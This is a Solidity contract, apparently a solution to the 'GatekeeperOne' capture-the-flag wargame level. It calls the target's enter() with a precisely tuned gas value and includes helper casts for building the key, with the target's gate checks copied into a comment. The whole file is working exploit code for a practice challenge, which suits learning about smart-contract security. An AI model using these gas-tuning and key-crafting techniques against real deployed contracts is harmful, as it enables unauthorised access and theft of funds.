// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './GateKeeperOne.sol';

contract AttackGateOne {

  using SafeMath for uint256;
  GatekeeperOne public gateKeeperOne;

  constructor(address addr) public {
      gateKeeperOne = GatekeeperOne(addr);
  }

  function enter(bytes8 _gateKey) public {
      gateKeeperOne.enter.gas(81910 + 208)(_gateKey);
  }

  function _uint32_uint64(bytes8 _gateKey) public view returns(uint32) {
      return uint32(uint64(_gateKey));
  }

  function _uint16_uint64(bytes8 _gateKey) public view returns(uint16) {
      return uint16(uint64(_gateKey));
  }

  function _uint64(bytes8 _gateKey) public view returns(uint64) {
      return uint64(_gateKey);
  }

  function _uint16_addr(address addr) public view returns(uint16) {
      return uint16(addr);
  }

  /* modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  } */
}